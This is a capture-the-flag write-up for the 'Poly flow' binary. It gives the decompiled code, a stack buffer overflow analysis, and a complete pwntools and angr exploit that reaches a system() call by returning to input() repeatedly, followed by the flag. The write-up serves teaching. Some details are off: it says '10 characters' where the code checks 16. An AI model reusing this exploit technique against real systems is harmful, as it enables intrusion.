# Poly flow

## Challenge

We are given a statically-linked, 32-bit, x86 binary with no PIE.

Upon connecting to the challenge or running the binary, we are prompted for a passphrase:

```
Enter the passphrase: 
```

Entering a test phrase causes the program to print "Incorrect." and exit.

```
Enter the passphrase: test
Incorrect.
```

### Decompilation

```c
undefined4 sym.check(char *s) {
    int32_t iVar1;
    undefined4 uVar2;
    char *var_14h;
    int32_t var_10h;
    uint32_t var_ch;
    int32_t var_4h;
    
    sym.__x86.get_pc_thunk.ax();
    iVar1 = sym.strlen(s);
    if (iVar1 == 0x10) {
        var_ch = 0;
        for (var_10h = 0; var_10h < 4; var_10h = var_10h + 1) {
            var_ch = var_ch + *(int32_t *)(s + var_10h * 4);
        }
        if (var_ch == 0xdeadbeef) {
            uVar2 = 1;
        }
        else {
            uVar2 = 0;
        }
    }
    else {
        uVar2 = 0;
    }
    return uVar2;
}

void sym.input(void) {
    int32_t unaff_EBX;
    char *s;
    int32_t var_4h;
    
    sym.__x86.get_pc_thunk.bx();
    if (*(int32_t *)(unaff_EBX + 0xc3a50) == 5) {
        sym.puts((char *)(unaff_EBX + 0x8a79c));
        sym.system(unaff_EBX + 0x8a7af);
        sym.puts((char *)(unaff_EBX + 0x8a7b8));
    }
    *(int32_t *)(unaff_EBX + 0xc3a50) = *(int32_t *)(unaff_EBX + 0xc3a50) + 1;
    sym.fgets(&s, 0x24, _obj.stdin);
    return;
}

undefined4 main(void) {
    int32_t iVar1;
    int32_t unaff_EBX;
    char acStack33 [4];
    int32_t var_19h;
    undefined uStack17;
    undefined auStack16 [3];
    int32_t var_9h;
    
    _auStack16 = &stack0x00000004;
    sym.__x86.get_pc_thunk.bx();
    sym.__printf(unaff_EBX + 0x8a72c);
    sym._IO_fflush(_obj.stdout);
    sym.__isoc99_scanf(unaff_EBX + 0x8a743, acStack33);
    uStack17 = 0;
    iVar1 = sym.check(acStack33);
    if (iVar1 == 0) {
        sym.puts((char *)(unaff_EBX + 0x8a748));
    }
    else {
        sym.input();
    }
    return 0;
}
```

### Checksec

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## Solution

In the disassembly for `input`, we can see that there is a buffer overflow vulnerability:

```asm
130: sym.input ();
; var char *s @ ebp-0x18
; var int32_t var_4h @ ebp-0x4
0x080498ca      83ec04         sub esp, 4
0x080498cd      50             push eax
0x080498ce      6a24           push 0x24                   ; sym.__libc_tsd_CTYPE_TOLOWER ; int size
0x08049860      55             push ebp
0x08049861      89e5           mov ebp, esp
0x08049863      53             push ebx
0x08049864      83ec14         sub esp, 0x14
...
0x080498d0      8d45e8         lea eax, [s]
0x080498d3      50             push eax                    ; char *s
0x080498d4      e867560100     call sym.fgets              ; char *fgets(char *s, int size, FILE *stream)
0x080498d9      83c410         add esp, 0x10
0x080498dc      90             nop
0x080498dd      8b5dfc         mov ebx, dword [var_4h]
0x080498e0      c9             leave
0x080498e1      c3             ret
```

Also, while the checksec output says there is a stack canary, there does not appear to be one for this function.
This is likely because the binary is statically-linked and checksec is detecting the canaries within the library functions.
For the purpose of our exploit, there is no canary.

Note that, to get to the `input` function and access this vulnerability, we first need to pass `0 = check(passphrase)`.
The `check` function takes our passphrase and verifies that it is 10 characters long.
It then performs a checksum operation and verifies that the checksum equals 0xdeadbeef.

We can solve this checksum using angr, by passing a symbolic passphrase and having it find a state where the program reaches the `input` function.

Next, notice that the call to `fgets` only leaves room for one return address, not a full ropchain.

Before calling `fgets`, there is a check at the start of the `input` function which compares a global variable at `*(int32_t *)(unaff_EBX + 0xc3a50)` to 5.
If the check succeeds, the program calls `system` on another global variable.
Assuming this is the win condition, we need to make `*(int32_t *)(unaff_EBX + 0xc3a50) == 5` true.

Note that the variable is incremented by 1 every time the input function runs.
We can simply return to the input function 5 times to make the variable equal 5.
Then, we return 1 more time to reach the if statement, pass the check, and achieve the win condition.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host binary.challs.pragyanctf.tech --port 6002 Poly-flow
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('Poly-flow')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'binary.challs.pragyanctf.tech'
port = int(args.PORT or 6002)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

import angr
import claripy

p = angr.Project(exe.path)

password_chars = [claripy.BVS("byte_%d" % i, 8) for i in range(0x10)]
password = claripy.Concat(*password_chars + [claripy.BVV(b'\0')])
password_addr = 0

s = p.factory.call_state(exe.sym['check'], password_addr,
        add_options=set.union(
            angr.options.unicorn,
            {
                angr.options.LAZY_SOLVES,
                angr.options.ZERO_FILL_UNCONSTRAINED_MEMORY,
                angr.options.ZERO_FILL_UNCONSTRAINED_REGISTERS,
            }))

s.memory.store(password_addr, password)

for c in password_chars:
    s.solver.add(c < 0x7f)
    s.solver.add(c > 0x20)

sim = p.factory.simgr(s)

sim.explore(find=0x0804984f, avoid=0x08049856)

password_concrete = bytes.fromhex(hex(sim.found[0].solver.eval(password))[2:])
print(password_concrete[:-1].decode())



io = start()

io.sendlineafter(
        b"Enter the passphrase: ",
        password_concrete + flat({0x18 + 0x4 - 1: exe.sym['input']})
        )

for i in range(5):
    io.sendline(flat({0x18 + 0x4: exe.sym['input']}))

io.interactive()
```

## Flag

```
p_ctf{mUlT1Pl3_BuFf3R_Ov3rF|0w}
```
